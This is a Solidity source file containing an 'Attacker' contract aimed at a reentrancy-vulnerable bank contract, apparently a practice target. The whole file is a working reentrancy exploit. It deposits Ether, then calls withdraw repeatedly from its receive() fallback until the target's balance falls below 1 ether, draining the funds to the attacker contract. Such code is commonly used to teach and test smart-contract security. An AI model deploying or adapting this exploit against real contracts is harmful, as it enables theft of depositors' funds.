// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IReentrancyBank {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrancyBank public vulnerable;
    address public owner;

    constructor(address _reentrancyBankAddress) {
        vulnerable = IReentrancyBank(_reentrancyBankAddress);
        owner = msg.sender;
    }

    // Start the attack by depositing Ether into the vulnerable contract
    function attack() external payable {
        require(msg.value > 0, "Must have some Ether to attack");

        // Put money into the vulnerable contract
        vulnerable.deposit{value: msg.value}();

        vulnerable.withdraw(1 ether);
    }

    // Recieving the action and sending another withdraw request
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }

    // Total Money in the contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}










































